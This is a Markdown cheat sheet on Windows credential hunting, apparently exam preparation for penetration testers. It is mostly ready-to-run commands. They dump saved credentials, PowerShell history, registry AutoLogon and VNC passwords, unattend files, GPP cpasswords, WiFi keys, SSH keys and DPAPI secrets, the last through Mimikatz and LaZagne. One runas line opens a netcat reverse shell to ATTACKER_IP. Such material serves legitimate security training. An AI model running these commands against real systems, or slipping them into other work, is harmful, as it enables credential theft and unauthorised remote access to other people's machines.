---
title: 'Credential Hunting'
description: 'Windows credential hunting techniques — registry credentials, unattend files, PowerShell history, GPP cpassword, saved credentials, WiFi passwords, and DPAPI secrets.'
---

# Credential Hunting

## Priority Checklist

Check these in order during the exam for quickest wins:

| # | Location | Command |
|:--|:---------|:--------|
| 1 | Saved credentials | `cmdkey /list` |
| 2 | PowerShell history | `type %APPDATA%\...\ConsoleHost_history.txt` |
| 3 | AutoLogon registry | `reg query "HKLM\...\Winlogon"` |
| 4 | Unattend files | `dir /s C:\Unattend.xml` |
| 5 | Registry password search | `reg query HKLM /f password /t REG_SZ /s` |
| 6 | IIS config | `type C:\inetpub\wwwroot\web.config` |
| 7 | GPP cpassword | `findstr /si "cpassword" \\DOMAIN\SYSVOL\...` |

---

## Saved Credentials (cmdkey / runas)

```cmd
:: List saved credentials
cmdkey /list

:: If credentials exist, run commands as that user
runas /savecred /user:DOMAIN\admin cmd.exe
runas /savecred /user:admin "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

!!! tip "This is often a quick win"
    `cmdkey /list` + `runas /savecred` is one of the simplest escalation paths. Always check this first.

---

## PowerShell History

PowerShell PSReadLine saves command history to a file by default. Users often type passwords in commands.

```cmd
:: Current user's history (ALWAYS check this)
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: Check all users' history files
for /f "tokens=*" %i in ('dir /s /b C:\Users\*ConsoleHost_history.txt 2^>nul') do @echo === %i === && @type "%i"
```

```powershell
# PowerShell — all users
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "=== $($_.FullName) ===" -ForegroundColor Yellow
    Get-Content $_.FullName
}
```

**What to look for**: `ConvertTo-SecureString`, passwords in `Invoke-Command`, connection strings, `net user` commands.

---

## Registry Credentials

### AutoLogon

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName AutoAdminLogon"
```

If `AutoAdminLogon = 1` and `DefaultPassword` contains a value → cleartext password.

### PuTTY Sessions

```cmd
:: Proxy passwords in saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr /i "ProxyPassword Hostname"
```

### SNMP Community Strings

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
```

### VNC Passwords

```cmd
:: TightVNC
reg query "HKCU\Software\TightVNC\Server" /v Password
reg query "HKLM\Software\TightVNC\Server" /v Password

:: RealVNC
reg query "HKLM\Software\RealVNC\vncserver" /v Password

:: Decrypt VNC passwords
vncpwd.exe ENCRYPTED_HEX
```

### General Registry Search

```cmd
:: Search for "password" in all registry values
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"
```

---

## Unattended Installation Files

Windows deployment files often contain base64-encoded or cleartext administrator passwords.

```cmd
:: Search common locations
dir /s /b C:\Unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend\Unattend.xml 2>nul
dir /s /b C:\Windows\System32\sysprep\Unattend.xml 2>nul
dir /s /b C:\Windows\System32\sysprep\sysprep.xml 2>nul
dir /s /b C:\sysprep.inf 2>nul
```

**What to look for** in the XML:

```xml
<AutoLogon>
    <Password>
        <Value>UGBhAHMAcwB3AG8AcgBkADEAMgAzAA==</Value>  <!-- base64 encoded -->
        <PlainText>false</PlainText>
    </Password>
    <Username>Administrator</Username>
</AutoLogon>
```

```bash
# Decode base64 password on attacker
echo "UGBhAHMAcwB3AG8AcgBkADEAMgAzAA==" | base64 -d
```

---

## IIS Configuration Files

```cmd
:: Web.config connection strings
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password userName"

:: .NET machine config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

:: Search recursively for web.config
dir /s /b C:\inetpub\web.config 2>nul
```

---

## Group Policy Preferences (GPP) — cPassword

Legacy GPP files in SYSVOL can contain encrypted passwords using a **known AES key** (published by Microsoft in MS14-025).

```cmd
:: Search SYSVOL for Groups.xml containing cpassword
findstr /si "cpassword" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\Policies\*.xml 2>nul

:: Search common GPP file names
dir /s /b \\%USERDNSDOMAIN%\SYSVOL\*.xml 2>nul | findstr /i "Groups Services Scheduledtasks DataSources Printers Drives"
```

```bash
# Decrypt the cpassword on attacker machine
gpp-decrypt "ENCRYPTED_CPASSWORD_STRING"
```

**Metasploit module**: `post/windows/gather/credentials/gpp`

---

## WiFi Passwords

```cmd
:: List saved WiFi profiles
netsh wlan show profiles

:: Get password for a specific network
netsh wlan show profile name="WiFiName" key=clear | findstr "Key Content"
```

---

## DPAPI Secrets

DPAPI (Data Protection API) encrypts user secrets using a master key derived from the user's password.

```cmd
:: List credential files
dir /a C:\Users\%username%\AppData\Local\Microsoft\Credentials\
dir /a C:\Users\%username%\AppData\Roaming\Microsoft\Credentials\
```

```
:: Mimikatz — decrypt DPAPI credentials
mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\CRED_FILE
:: Note the guidMasterKey

mimikatz# dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\MASTERKEY /rpc
:: /rpc flag uses DC to decrypt (if domain-joined and you have a domain session)

mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\CRED_FILE /masterkey:DECRYPTED_KEY
```

---

## File System Search

```cmd
:: Search for password strings in file contents
findstr /si "password" *.txt *.ini *.config *.xml *.cfg *.json
findstr /spin "password" *.*

:: Recursive search from common locations
findstr /si /m "password" C:\Users\*.txt C:\Users\*.config 2>nul
findstr /si /m "password" C:\inetpub\*.config 2>nul

:: Find interesting file types
dir /s /b C:\Users\*.kdbx 2>nul           :: KeePass databases
dir /s /b C:\Users\*.key C:\Users\*.pem 2>nul :: SSH/SSL keys
dir /s /b C:\Users\*id_rsa* 2>nul         :: SSH private keys
dir /s /b C:\Users\*.pfx C:\Users\*.p12 2>nul :: Certificates
dir /s /b C:\Users\*.rdp 2>nul             :: RDP connection files
```

---

## LaZagne — Automated Credential Extraction

Extracts credentials from many applications automatically.

**Repo**: [github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

```cmd
:: Extract all credentials
lazagne.exe all

:: Specific modules
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe sysadmin
lazagne.exe databases
```
